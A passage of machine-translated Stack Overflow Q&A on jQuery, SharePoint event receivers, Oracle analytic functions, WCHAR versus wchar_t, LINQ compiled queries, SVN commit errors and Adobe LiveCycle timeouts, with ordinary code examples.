由于这些服务是从 IIS Web 服务器提供的，因此检查根站点上的绑定可以解决问题。有人弄乱了站点绑定，定义了重叠的规则并弄乱了服务。

就我而言，修复正确的绑定解决了这个问题，而且我不必配置 Web.Config。

# javascript - 下拉列表上的项目添加事件（选项选择器）

> ID：561827
> 
> 赞同：1
> 
> 时间：2009-02-18T16:28:53.750
> 
> 标签：javascript, jquery, html

给定一个下拉列表，是否有任何方法可以订阅 javascript，即使在将新项目添加到列表时也会触发它？

我想像下面这样工作

```
$("select").itemAdded(function(value, text) { 
    alert(text + " has just been added to the list of options");
});

$("select").append($("<option></option").val("1").html("Something"));
//results in alert of "Something has just been added to the list of options" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T16:40:47.310

这应该适用于所有浏览器（包括资源管理器，这是一个关于这类事情的错误）。

```
var option = document.createElement("option");
option.text = 'The visual value';
option.value = 'Th submitted value';
$("select")[0].options.add(option); 
```

编辑：我可能应该停止懈怠，并为您提供完整的代码以使其作为 jQuery 插件工作。

```
(function($) {
    $.fn.add_option = function(options) {
        var config = {
            value:0,
            text:0
        }
        config = $.extend(config, options);
        return this.each(function() {
            var option = document.createElement("option");
            option.text = config.text;
            option.value = config.value;
            $(this)[0].options.add(option);
            alert(config.text+ " has just been added to the list of options");
        }
    }
})(jQuery);
$(document).ready(function() {
    $('#id_of_select_dropdown').add_option({text:'My new text value', value:'new'});
}); 
```

# sharepoint - 您如何将事件接收器绑定到*特定*自定义内容类型？

> ID：561835
> 
> 赞同：3
> 
> 时间：2009-02-18T16:31:09.127
> 
> 标签：sharepoint, event-handling, content-type

我创建了一个事件接收器并添加到 GAC。

如何将事件接收器绑定到*特定*的自定义内容类型？

我需要从 XML 文件中执行此操作：

到目前为止，我有：

Feature.xml 指向 Elements.xml 文件，但不确定 Elements.xml 文件。

您如何引用特定的内容类型？（我有特定内容类型的指南）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-18T17:20:04.097

要将事件接收器绑定到特定的内容类型，请使用内容类型元素文件的 XmlDocuments 元素。[这是我即将出版的书“构建 SharePoint 用户体验”中](http://www.understandingsharepoint.com/userexperience)的一段相当独特的摘录：

而且，为了澄清，由于我没有看到您尝试发布的 XML，您可以将其添加到 elements.xml 文件中的内容类型声明中。

(...)

**使用功能将事件接收器附加到内容类型**

像我们刚刚看到的那样附加事件接收器的重要一点是要注意没有办法将接收器绑定到内容类型，只能绑定到列表模板。

不，也没有办法将接收者添加到单个列表中。但是，正如我们在列表森林一章的电子邮件启用自定义列表部分中看到的，我们可以使用代码以编程方式添加事件接收器。我们也可以使用相同的技术将事件接收器添加到内容类型，但应该有一种方法可以在功能中使用 CAML 来做到这一点。毕竟这是我们定义内容类型的地方，我们将在本章后面看到。

答案？内容类型中的事件接收器在元素文件的不同部分中定义。我们再次查看 XmlDocuments 和第三个内置 XmlDocument 类型的 Receiver。Receiver XmlDocument 位于[http://schemas.microsoft.com/sharepoint/events](http://schemas.microsoft.com/sharepoint/events)命名空间中。如果要在默认 SharePoint 安装中查看 Receiver XmlDocument，请在 ctypeswss.xml 文件中搜索内容类型 0x010107、DocumentWorkflowItem：

```
<XmlDocument NamespaceURI="http://schemas.microsoft.com/sharepoint/events">
 <spe:Receivers xmlns:spe="http://schemas.microsoft.com/sharepoint/events">
  <Receiver>
   <Name>Workflow Library Item Added</Name>
   <Type>ItemAdded</Type>
   <SequenceNumber>1</SequenceNumber>
   <Assembly>Microsoft.SharePoint, Version=12.0.0.0, Culture=neutral,~CCC
    PublicKeyToken=71e9bce111e9429c</Assembly>
   <Class>Microsoft.SharePoint.Workflow.SPWorkflowLibraryEventReceiver</Class>
   <Data />
   <Filter />
  </Receiver>
… (snipped for space saving purposes
 </Receivers>
</XmlDocument> 
```

注意 该示例对 Receivers 元素使用前缀 spe:。从技术角度来看，这不是必需的，但可以使您的代码更加清晰。如您所见，Receiver 元素遵循元素中定义的常规项目事件接收器的结构。当然，除了接收者是在内容类型的 XmlDocument 部分中定义的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-12-23T11:21:04.647

@Larsi：这里有同样的问题。看起来“继承”设置为 true 会导致错误，然后 XmlDocuments 被完全忽略：@ 因此，我们正在自定义功能中修复此问题并使用对象模型绑定事件接收器。

# sql - Oracle“分区依据”关键字

> ID：561836
> 
> 赞同：278
> 
> 时间：2009-02-18T16:31:10.017
> 
> 标签：sql, oracle, window-functions

有人可以解释一下`partition by`关键字的作用并给出一个简单的例子，以及为什么要使用它？我有一个由其他人编写的 SQL 查询，我正试图弄清楚它的作用。

分区示例：

```
SELECT empno, deptno, COUNT(*) 
OVER (PARTITION BY deptno) DEPT_COUNT
FROM emp 
```

我在网上看到的例子似乎有点太深入了。

* * *

## 回答 #1

> 赞同：283
> 
> 时间：2009-02-18T16:42:47.150

该`PARTITION BY`子句设置将用于`OVER`子句中每个“GROUP”的记录范围。

在您的示例 SQL 中，`DEPT_COUNT`将为每个员工记录返回该部门内的员工人数。（就好像您正在对`emp`表进行去规范化；您仍然返回`emp`表中的每条记录。）

```
emp_no  dept_no  DEPT_COUNT
1       10       3
2       10       3
3       10       3 <- three because there are three "dept_no = 10" records
4       20       2
5       20       2 <- two because there are two "dept_no = 20" records 
```

如果还有另一列（例如，`state`），那么您可以计算该州有多少个部门。

这就像在不聚合结果集（即删除匹配记录）的情况下获得`GROUP BY`( `SUM`,`AVG`等) 的结果。

例如，当您使用`LAST OVER`or`MIN OVER`函数获取部门中的最低和最高薪水，然后在*没有*子选择的情况下对此记录薪水进行计算时，它很有用，这要快得多。

阅读链接的[AskTom 文章](http://asktom.oracle.com/pls/asktom/f?p=100:11:0::::P11_QUESTION_ID:3170642805938)了解更多详细信息。

* * *

## 回答 #2

> 赞同：198
> 
> 时间：2016-06-24T13:32:19.703

公认的答案很好地解释了这个概念，但我发现看到的例子越多，它就越好。这是一个增量示例：

1)**老板说**“给我按品牌分组的库存商品数量”

**你说**：“没问题”

```
SELECT 
      BRAND
      ,COUNT(ITEM_ID) 
FROM 
      ITEMS
GROUP BY 
      BRAND; 
```

结果：

```
+--------------+---------------+
|  Brand       |   Count       | 
+--------------+---------------+
| H&M          |     50        |
+--------------+---------------+
| Hugo Boss    |     100       |
+--------------+---------------+
| No brand     |     22        |
+--------------+---------------+ 
```

2）**老板说**“现在给我一份所有物品的清单，包括他们的品牌和各自品牌拥有的物品数量”

你可以试试：

```
 SELECT 
      ITEM_NR
      ,BRAND
      ,COUNT(ITEM_ID) 
 FROM 
      ITEMS
 GROUP BY 
      BRAND; 
```

但是你得到：

```
ORA-00979: not a GROUP BY expression 
```

这就是`OVER (PARTITION BY BRAND)`进来的地方：

```
 SELECT 
      ITEM_NR
      ,BRAND
      ,COUNT(ITEM_ID) OVER (PARTITION BY BRAND) 
 FROM 
      ITEMS; 
```

这意味着：

*   `COUNT(ITEM_ID)`- 获取项目数量
*   `OVER`- 在行集上
*   `(PARTITION BY BRAND)`- 具有相同品牌的

结果是：

```
+--------------+---------------+----------+
|  Items       |  Brand        | Count()  |
+--------------+---------------+----------+
|  Item 1      |  Hugo Boss    |   100    | 
+--------------+---------------+----------+
|  Item 2      |  Hugo Boss    |   100    | 
+--------------+---------------+----------+
|  Item 3      |  No brand     |   22     | 
+--------------+---------------+----------+
|  Item 4      |  No brand     |   22     | 
+--------------+---------------+----------+
|  Item 5      |  H&M          |   50     | 
+--------------+---------------+----------+ 
```

ETC...

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2009-02-27T04:47:56.063

它是称为分析的 SQL 扩展。select语句中的“over”告诉oracle该函数是解析函数，而不是按函数分组。使用分析的优势在于，您只需通过一次数据即可收集总和、计数等，而不是使用子选择或更糟糕的 PL/SQL 循环遍历数据。

乍一看确实令人困惑，但这很快就会成为第二天性。没有人能比 Tom Kyte 更好地解释它。所以上面的链接很棒。

当然，阅读[文档](http://download.oracle.com/docs/cd/B28359_01/server.111/b28286/functions001.htm#insertedID3)是必须的。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-08-25T06:45:14.750

```
EMPNO     DEPTNO DEPT_COUNT 
```

* * *

```
 7839         10          4
 5555         10          4
 7934         10          4
 7782         10          4 --- 4 records in table for dept 10
 7902         20          4
 7566         20          4
 7876         20          4
 7369         20          4 --- 4 records in table for dept 20
 7900         30          6
 7844         30          6
 7654         30          6
 7521         30          6
 7499         30          6
 7698         30          6 --- 6 records in table for dept 30 
```

在这里，我们正在获取各个 deptno 的计数。至于 deptno 10，我们在表 emp 中有 4 条记录，对于 deptno 20 和 30 也有类似的结果。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-10-28T05:54:27.590

over partition 关键字就像我们通过 client_id 对数据进行分区一样，创建每个客户端 id 的子集

```
select client_id, operation_date,
       row_number() count(*) over (partition by client_id order by client_id ) as operationctrbyclient
from client_operations e
order by e.client_id; 
```

此查询将返回 client_id 完成的操作数

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-11-19T19:13:45.600

我认为，这个例子暗示了分区如何工作和分组如何工作的细微差别。我的示例来自 Oracle 12，如果我的示例恰好是一个编译错误。

我试过 ：

```
SELECT t.data_key
,      SUM ( CASE when t.state = 'A' THEN 1 ELSE 0 END) 
OVER   (PARTITION BY t.data_key) count_a_rows
,      SUM ( CASE when t.state = 'B' THEN 1 ELSE 0 END) 
OVER   (PARTITION BY t.data_key) count_b_rows
,      SUM ( CASE when t.state = 'C' THEN 1 ELSE 0 END) 
OVER   (PARTITION BY t.data_key) count_c_rows
,      COUNT (1) total_rows
from mytable t
group by t.data_key  ---- This does not compile as the compiler feels that t.state isn't in the group by and doesn't recognize the aggregation I'm looking for 
```

然而，这按预期工作：

```
SELECT distinct t.data_key
,      SUM ( CASE when t.state = 'A' THEN 1 ELSE 0 END) 
OVER   (PARTITION BY t.data_key) count_a_rows
,      SUM ( CASE when t.state = 'B' THEN 1 ELSE 0 END) 
OVER   (PARTITION BY t.data_key) count_b_rows
,      SUM ( CASE when t.state = 'C' THEN 1 ELSE 0 END) 
OVER   (PARTITION BY t.data_key) count_c_rows
,      COUNT (1) total_rows
from mytable t; 
```

根据外部键“data_key”产生每个状态的元素数量。因此，如果 data_key = 'APPLE' 有 3 行状态为“A”，2 行状态为“B”，一行状态为“C”，“APPLE”的对应行将是“APPLE”，3,2 , 1, 6。

# oracle - IN 子句的函数或过程

> ID：561837
> 
> 赞同：5
> 
> 时间：2009-02-18T16:31:58.173
> 
> 标签：oracle, ora-01722

我想编写一个可以在另一个过程的 IN 子句中使用的函数或过程。该函数或过程将返回 ID 号。

主要程序会说类似

```
SELECT *
FROM EMPLOYEES
WHERE OFFICE_ID IN (GET_OFFICE_IDS);  -- GET_OFFICE_IDS requires no parameters 
```

GET_OFFICE_IDS 返回一个 VARCHAR2，ID 用逗号分隔。当我运行主程序时，我得到一个“ORA-01722：无效号码”错误，这是有道理的，但我不知道我需要从这里去哪里。

我是否需要 GET_OFFICE_IDS 来创建主过程使用的临时表？如果是这样，会不会有性能损失？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-18T17:09:01.783

这是使用 EMP 表的嵌套表解决方案的工作示例：

```
create type t_ids is table of integer
/

create or replace function get_office_ids return t_ids
is
   l_ids t_ids := t_ids();
   l_idx integer := 0;
begin
   for r in (select empno from emp where deptno=10)
   loop
      l_ids.extend;
      l_idx := l_idx+1;
      l_ids(l_idx) := r.empno;
   end loop;
   return l_ids;
end;
/

select ename from emp where empno in (select * from table(get_office_ids));

ENAME
----------
CLARK
KING
TEST
MILLER
BINNSY
FARMER 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T16:38:25.320

简单的蛮力方法：

```
WHERE ','||GET_OFFICE_IDS||',' LIKE '%,'||OFFICE_ID||',%' 
```

最好将 GET_OFFICE_IDS 更改为返回嵌套表并使用以下内容：

```
OFFICE_ID IN (SELECT * FROM TABLE(GET_OFFICE_IDS)) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T16:37:09.347

我不了解 oracle SQL，但是您不能简单地在 IN 子句中添加另一个 select 语句来返回 ID 吗？

SELECT * FROM EMPLOYEES WHERE_ID IN (SELECT ID FROM tbl_X WHERE x=y);

...或者您是否希望做一些更复杂的事情？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T17:25:47.920

您可以使用 ref_cursor (ref cursor c := 'select '||.... ) 来执行此操作

但是流水线功能非常有效。像这样使用它：

```
create or replace type type_varchar2 as table of varchar2(100);

create or replace function GET_OFFICE_IDS return TYPE_varchar2 PIPELINED
is
  retval VARCHAR2(100);
begin
  -- put some sql here which results in statements as below
 retval := '135';
 PIPE ROW (retval);
 retval := '110';
 PIPE ROW (retval);
end GET_OFFICE_IDS;

select *
from entries
where id in (SELECT COLUMN_VALUE FROM TABLE(GET_OFFICE_IDS)); 
```

通常流水线函数执行得非常好。然而，具有很多条目的子查询并不总是很好。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T20:17:04.683

*编辑：我违反了 SO 的基本规则，我没有回答 OP。由于已经有一个公认的答案，我觉得警告是谨慎的。*

通常，混合使用 SQL 和 PL/SQL 是一个非常糟糕的主意。有 2 个独立的代码引擎。有一个 SQL 引擎和一个 PL/SQL 引擎。强制来回切换数千次绝对会降低性能。

我理解程序员为什么要这样做。我得到它。这一切都是封装的、温暖的和模糊的，但它会严重地削弱你。就像大自然一样，它会用它的景象和声音来引诱你，然后它会折断你的脚踝。

甚至像这样愚蠢的事情。

```
create or replace function my_Date (p_Date in date)
return varchar
as
begin

    return to_char(p_Date, 'yyyy/mm/dd');

end; 
```

会**杀死**你的执行时间。

打开**自动跟踪**

然后运行这些。

```
select to_char(created, 'yyyy/mm/dd'), to_char(last_ddl_time, 'yyyy/mm/dd')  from all_objects

select my_date(created), my_Date(last_DDL_TIME) From all_objects 
```

第二个需要两倍的时间来运行。我在 1 秒内得到查询 1 和在 2 秒内得到 2 的答案。

这是*一个非常简单的案例*……我所做的只是转换值。想象一下，如果您必须按照自己的意愿加入它。这真的是最坏的情况。

现在想想当你在函数中隐藏东西时优化器完全无法做的事情。

当你做一个 IN 时，有时作为一个连接做起来要快得多。如果某些条件为真，优化器将为您执行此操作。它会将 IN 转换为 JOIN。但是因为你把select伪装在了一个函数里面，它就不能再判断条件是否成熟了。你已经**强迫**优化器做一些次优的事情。

优化器依赖的一个关键统计数据是行数。是一行还是十亿。它从表和索引的统计信息中知道。您的功能没有统计信息。

你可以把它们放在那里，可以暗示基数，我不是说你不能，但是为什么呢？你为什么想要？看起来您正在使用该函数，因为您是一个勤奋的程序员，他一生都被告知要将冗余代码分解为函数。

你脑海中的那些规则，几乎没有一个适用于 SQL。优化器不是编译器。它不能内联你的函数。只有您可以帮助您的优化人员获得最佳计划。

# c++ - “WCHAR”和“wchar_t”有什么区别？

> ID：561839
> 
> 赞同：24
> 
> 时间：2009-02-18T16:32:59.870
> 
> 标签：c++

`WCHAR`和之间有什么实际区别`wchar_t`吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-02-18T16:52:35.580

`wchar_t`是一个独特的类型，由 C++ 标准定义。

`WCHAR`是*非标准*的，据我所知，仅存在于 Windows 上。但是，它只是一个`typedef`（或可能是一个宏） for `wchar_t`，因此没有实际区别。

旧版本的 MSVC 没有`wchar_t`作为一等类型——相反，它只是一个`typedef`for`short`

最有可能的是，Microsoft 引入`WCHAR`了在任何编译器版本中表示“宽字符类型”，无论是否`wchar_t`作为本机类型存在。

你应该`wchar_t`在你的代码中使用。这就是它的用途。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-02-18T16:34:50.133

好吧，一个实际的区别是`WCHAR`我的平台上不存在。仅适用于 Windows（并且无意将程序移植到另一个平台）并且包含必要的标头，它是相同的（因为`WCHAR`只是 a `typedef`）。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-02-19T05:35:00.380

有人知道几岁`WCHAR`吗？我想它至少可以追溯到 Windows NT 3.1。我推测当微软开始`WCHAR`在 Windows 标头中使用时，`wchar_t`在 C 或 C++ 标准中都没有定义。如果我错了，请纠正我。

微软处于不得不支持声明和标头的令人羡慕的位置，a) 必须在 C 和 C++ 中工作；b) 在非常不同的架构（i86、MIPS、PowerPC、Alpha 等）下编译，c) 必须向后兼容为 15 年以上的编译器编写的源代码。另外，在过去的二十年中出版的任何重大变化和成千上万的书籍、参考手册、在线文档等都会突然变成错误的。

`WCHAR`是一个接口——一旦它被发布，它就是一成不变的，即使新代码不需要它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T16:37:29.237

实际上，没有太大的区别。它们都代表相同的基础类型。一个 2 字节宽度的值。

LibT 将很快为您提供各种平台与 C++ 标准之间的真正疯狂差异 :)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-12-01T05:15:52.343

typedef wchar_t WCHAR; // wc，16 位 UNICODE 字符

这是在 winnt.h 中定义的。所以最初它是 wchar_t WCHAR 是它的缩写。您可以同时使用 wcscat、wcslen 等函数

# javascript - 如何使用 jquery 用鼠标移动 div？

> ID：561844
> 
> 赞同：14
> 
> 时间：2009-02-18T16:34:23.427
> 
> 标签：javascript, jquery, html, dom

我需要能够用鼠标移动 div 并将 div 的新位置存储在数据库中以记住显示。我该怎么做？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-02-18T16:41:33.517

我强烈建议您研究[jQuery UI](http://jqueryui.com/)和可拖动交互。基本上，您需要将代码添加到您的可拖动 div（假设它具有 id="draggable"）：

```
$("#draggable").draggable(); 
```

然后，将您的必要行为放在停止事件中。更具体地说，你会这样做：

```
$('#draggable').draggable({
    stop: function(event, ui) { ... }
}); 
```

至于数据库存储，您可以在上述函数中使用 AJAX 调用，也可以将其存储在页面中，这样一些表单发送或其他操作导致位置信息被传递到服务器并与其他内联存储数据。我会小心使用 AJAX 调用，因为您可能会在每个浏览器上每次拖动时用位置数据轰炸您的数据库。取决于你的应用程序...

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-01-24T06:35:36.173

这是我刚刚编写的一个小 jQuery 函数，让您可以仅使用 jQuery 而不是使用 jQuery UI 来拖动 div。

```
/* PlugTrade.com - jQuery draggit Function */
/* Drag A Div with jQuery */
jQuery.fn.draggit = function (el) {
    var thisdiv = this;
    var thistarget = $(el);
    var relX;
    var relY;
    var targetw = thistarget.width();
    var targeth = thistarget.height();
    var docw;
    var doch;

    thistarget.css('position','absolute');

    thisdiv.bind('mousedown', function(e){
        var pos = $(el).offset();
        var srcX = pos.left;
        var srcY = pos.top;

        docw = $('body').width();
        doch = $('body').height();

        relX = e.pageX - srcX;
        relY = e.pageY - srcY;

        ismousedown = true;
    });

    $(document).bind('mousemove',function(e){ 
        if(ismousedown)
        {
            targetw = thistarget.width();
            targeth = thistarget.height();

            var maxX = docw - targetw - 10;
            var maxY = doch - targeth - 10;

            var mouseX = e.pageX;
            var mouseY = e.pageY;

            var diffX = mouseX - relX;
            var diffY = mouseY - relY;

            // check if we are beyond document bounds ...
            if(diffX < 0)   diffX = 0;
            if(diffY < 0)   diffY = 0;
            if(diffX > maxX) diffX = maxX;
            if(diffY > maxY) diffY = maxY;

            $(el).css('top', (diffY)+'px');
            $(el).css('left', (diffX)+'px');
        }
    });

    $(window).bind('mouseup', function(e){
        ismousedown = false;
    });

    return this;
} // end jQuery draggit function // 
```

jQuery 函数甚至可以防止 div 越界。基本上，您将它附加到您注定要成为拖动激活器的 div（例如标题栏）。调用它就像这样简单：

```
$("#titleBar").draggit("#whatToDrag"); 
```

因此，#titleBar 将是您的标题栏 div 的 id，而 #whatToDrag 将是您想要拖动的内容的 id。对于凌乱的代码，我深表歉意，我只是修改了它，并认为它可以为您提供 jQuery UI 的替代方案，同时仍使其易于实现。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-03T23:49:42.450

如果有很多对象，那么 mousemove 会变得很昂贵。解决它的一个步骤是在 mousedown 上绑定处理程序并在 mouseup 上解除绑定。但是，此示例并未使用多个对象编写和测试；特别是，当前解除绑定解除了之前绑定的所有内容（可以通过命名 lambda 表达式并在解除绑定中引用该名称来解决）。

```
jQuery.fn.dragdrop = function (el) {
    this.bind('mousedown', function (e) {
        var relX = e.pageX - $(el).offset().left;
        var relY = e.pageY - $(el).offset().top;
        var maxX = $('body').width() - $(el).width() - 10;
        var maxY = $('body').height() - $(el).height() - 10;
        $(document).bind('mousemove', function (e) {
            var diffX = Math.min(maxX, Math.max(0, e.pageX - relX));
            var diffY = Math.min(maxY, Math.max(0, e.pageY - relY));
            $(el).css('left', diffX + 'px').css('top', diffY + 'px');
        });
    });
    $(window).bind('mouseup', function (e) {
        $(document).unbind('mousemove');
    });
    return this;
};
$(document).ready(function () {
    return $('#obj').dragdrop('#obj');
}); 
```

或在Parenscript中：

```
(setf (chain j-query fn dragdrop)                                                                                      
      (lambda (el)                                                                                                     
        (chain this                                                                                                    
               (bind :mousedown                                                                                        
                     (lambda (e)                                                                                       
                       (let ((rel-x (- (chain e page-x) (chain ($ el) (offset) left)))                                 
                             (rel-y (- (chain e page-y) (chain ($ el) (offset) top)))                                  
                             (max-x (- (chain ($ :body) (width)) (chain ($ el) (width)) 10))                           
                             (max-y (- (chain ($ :body) (height)) (chain ($ el) (height)) 10)))                        
                         (chain ($ document)                                                                           
                                (bind :mousemove                                                                       
                                      (lambda (e)                                                                      
                                        (let ((diff-x (min max-x (max 0 (- (chain e page-x) rel-x))))                  
                                              (diff-y (min max-y (max 0 (- (chain e page-y) rel-y)))))                 
                                          (chain ($ el) (css :left (+ diff-x :px)) (css :top  (+ diff-y :px))))))))))) 
        (chain ($ window)                                                                                              
               (bind :mouseup                                                                                          
                     (lambda (e)                                                                                       
                       (chain ($ document)                                                                             
                              (unbind :mousemove)))))                                                                  
        this)) 
```

# c# - Linq 编译查询而不传递上下文

> ID：561853
> 
> 赞同：4
> 
> 时间：2009-02-18T16:35:50.817
> 
> 标签：c#, linq, linq-to-sql, precompiled

考虑这个编译的 linq-to-sql 查询：

```
private static Func<LINQDBDataContext, string, IQueryable<Pet>> 
    QueryFindByName =
    CompiledQuery.Compile((
    MyLinqDataContext context, string name) =>
    from p in context.Pets where p.Name == name select p); 
```

但是我已经在类中持有对上下文的私有引用，我希望能够在不暴露上下文的情况下将查询标记为公共，例如

```
private static MyLinqDataContext context = SomeUtilityClass.GetMeMyContext();
//...
public static Func<string, IQueryable<Pet>> QueryFindByName = 
    CompiledQuery.Compile((string name) =>
    from p in this.context.Pets where p.Name == name select p); 
    //doesn't compile as expects TArg0 to be a DataContext. 
```

有没有办法在不为每个查询创建公共包装函数的情况下做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T16:42:42.093

您对上下文的引用是静态的，即您在整个类型中都有一个上下文吗？这对我来说听起来不是一个好主意。无论如何，把它留到一边，你可以这样做：

```
// Private version which takes a context...
private static Func<LINQDBDataContext, string, IQueryable<Pet>> 
    QueryFindByNameImpl =
    CompiledQuery.Compile((
    LINQDBDataContext context, string name) =>
    from p in context.Pets where p.Name == name select p);

// Public version which calls the private one, passing in the known context
public static Func<string, IQueryable<Pet>> QueryFindByName = 
    name => QueryFindByNameImpl(contextFromType, name); 
```

编辑：好的，如果您不喜欢这种方法，您可以尝试编写自己的通用包装器`CompiledQuery.Compile`。例如：

```
public static class LinqHelpers
{
    public static Func<TArg0, TResult> Compile<TContext, TArg0, TResult>
        (this TContext context, 
         Expression<Func<TContext, TArg0, TResult>> query)
        where TContext : DataContext
    {
        Func<TContext, TArg0, TResult> compiled = 
            CompiledQuery.Compile(query);
        return arg => compiled(context, arg);
    }
} 
```

（等等更多参数。）

我什至没有尝试编译它，但我*认为*它会起作用。然后你会像这样使用它：

```
private static MyLinqDataContext context = SomeUtilityClass.GetMeMyContext();

public static Func<string, IQueryable<Pet>> QueryFindByName = context.Compile
    ((LINQDBDataContext context, string name) =>
      from p in context.Pets where p.Name == name select p); 
```

当然，它仍在创建一个包装器，但至少你只需要在一个地方完成它。如果您反对创建包装器不是因为它的乏味/代码混乱，请提供更多详细信息。

# svn - SVN 错误 - 501 未实现 提交失败

> ID：561855
> 
> 赞同：7
> 
> 时间：2009-02-18T16:36:09.677
> 
> 标签：svn, tortoisesvn, visualsvn-server

我在存储库中有一个无法提交的文件夹，甚至父文件夹也无法提交。这发生在几周前，然后起作用，然后再次眨眼。我已经清除了我的身份验证缓存，但没有任何帮助。我仍然可以使用其他中继，但不能使用此中继，并且错误消息无法帮助我去哪里。我已经完成了清理工作。我已经从存储库中的 VisualSVN 创建了一个新目录，并且存在同样的问题。你有什么建议吗？我可以核对 .svn 文件夹并提供帮助吗？我不想从新的 repo 开始，因为我们已经集成了 TeamCity 并进行了观察。提前帮助和感谢！道格

**错误：提交失败（详情如下）：

错误：服务器发送了意外的返回值（501 未实现）以响应

错误：“/svn/MAHCP/trunk/src/RssaSolution/Mahcp.Rssa”的 PROPFIND 请求**

我也在 SVNForum 上发过帖子，但有没有其他人遇到过这种疯狂的情况！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-18T18:02:49.640

这通常是代理或病毒扫描程序/防火墙拒绝 DAV 请求（PROPFIND 不是“正常”http 请求，而是与 DAV 一起使用）。

所以：检查您的代理和/或病毒扫描程序/防火墙并将它们配置为允许 DAV 请求。

此外，有时使用 https 而不是 http 会有所帮助，这样这些应用程序就无法再检查网络流量并对其进行干扰。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T21:28:22.470

存储库主干有一个旧的过时 URL。我希望该错误更具描述性。谢谢大家......如果我有更多的声誉，我会给你两分！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-06T22:24:23.470

答案是 svn 服务器 URL 之前已更改，然后在尝试重新检查它时会出错。然后的诀窍是核对 .svn 文件夹，重新下载，然后复制我的新更改。我希望错误消息更好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-26T09:25:58.880

如果您使用 subclipse 尝试将 SVN 接口客户端从 JavaHL 更改为 SVNKid

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-02-11T19:26:48.617

还要检查是否最近安装了 mod_security。至少在 CentOS 上，它的默认配置没有允许 SVN 所需的行。

在`/etc/httpd/modsecurity.d/modsecurity_crs_30_http_policy.conf`，我把它放在*允许的请求方法*部分：

```
SecRule REQUEST_METHOD "^(PROPFIND|PROPPATCH)$" allow
SecRule REQUEST_METHOD "^(REPORT|OPTIONS)$" allow
SecRule REQUEST_METHOD "^(MKACTIVITY|CHECKOUT)$" allow
SecRule REQUEST_METHOD "^(PUT|DELETE|MERGE)$" allow 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-30T14:35:01.007

`Anonymous lock creation is not allowed.`在我在服务器上的 /var/log/apache2/error.log 中发现消息之前，我在另一个客户端上遇到了类似的问题。确保客户端不会匿名连接到服务器。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2015-04-01T08:07:38.517

删除文件夹/home/user/.subversion，

然后重新启动IDE或svn。

# java - 如何增加 Adob e LiveCycle 服务器中的事务超时？长时间服务调用失败并出现超时异常

> ID：561858
> 
> 赞同：1
> 
> 时间：2009-02-18T16:37:25.070
> 
> 标签：java, pdf, livecycle

我们正在使用 Adob​​e LiveCycle ConvertPDF 服务转换大型 PDF 文件。

这适用于较小的 PDF 文件，但当我们尝试转换较大的 PDF 文件（大约 150mb - 不要问）时会失败。

看起来 Adob​​e 将事务超时设置为 14（？）分钟左右。由于我们巨大的 PDF 的处理时间超过了这个时间，操作被中止。我们尝试了多个 PDF，因此这不太可能是由损坏的输入文件引起的。

这是异常产生的输出：

```
com.adobe.livecycle.convertpdfservice.exception.ConvertPdfException: ALC-DSC-000-000: com.adobe.idp.dsc.DSCException: Internal error.
    at com.adobe.convertpdf.docservice.ConvertPdfServiceImpl.toPS2WithSMT(ConvertPdfServiceImpl.java:117)
    at com.adobe.convertpdf.docservice.ConvertPdfServiceImpl.toPS2(ConvertPdfServiceImpl.java:93)
    [...]
Caused by: ALC-DSC-000-000: com.adobe.idp.dsc.DSCException: Internal error.
    at com.adobe.convertpdf.docservice.ConvertPdfServiceImpl$1.doInTransaction(ConvertPdfServiceImpl.java:110)
    at com.adobe.idp.dsc.transaction.impl.ejb.adapter.EjbTransactionBMTAdapterBean.doRequiresNew(EjbTransactionBMTAdapterBean.java:218)
    [...]
Caused by: com.adobe.livecycle.convertpdfservice.exception.ConvertPdfException: Cannot convert PDF file to PostScript. 
Exception: "Transaction timed out: Couldn't connect to Datamanager Service"
    at com.adobe.convertpdf.ConvertPdfBmcWrapper.convertPdftoPs(ConvertPdfBmcWrapper.java:207)
    at com.adobe.convertpdf.ConvertPdfServer.convertPdftoPs(ConvertPdfServer.java:121)
    at com.adobe.convertpdf.docservice.ConvertPdfServiceImpl.toPS2InTxn(ConvertPdfServiceImpl.java:129)
    [...] 
```

到目前为止 - 似乎合乎逻辑。

但是，我找不到配置事务长度的位置。我想如果我们将超时时间增加到 30 分钟左右，我们的问题就会消失。（如果我们能够在没有任何事务的情况下调用此操作，问题也会消失......）

假设我们只是像这样运行它：

```
ServiceClientFactory factory = com.adobe.idp.dsc.clientsdk.ServiceClientFactory.createInstance(connectionProps);

ConvertPdfServiceClient convertPDFClient = new com.adobe.livecycle.convertpdfservice.client.ConvertPdfServiceClient(factory);

// ... set-up details skipped ...
com.adobe.idp.Document result_postscript = convertPDFClient.toPS2(inPdf,options);
result_postscript.copyToFile(new File("c:/Adobe/output.ps")) 
```

但是，要么我们没有正确设置 ServiceClientFactory，要么没有正确读取 JBoss 配置，我们无法找到延长事务寿命的方法。（交易时间真的是问题吗？）

* * *

## 回答 #1

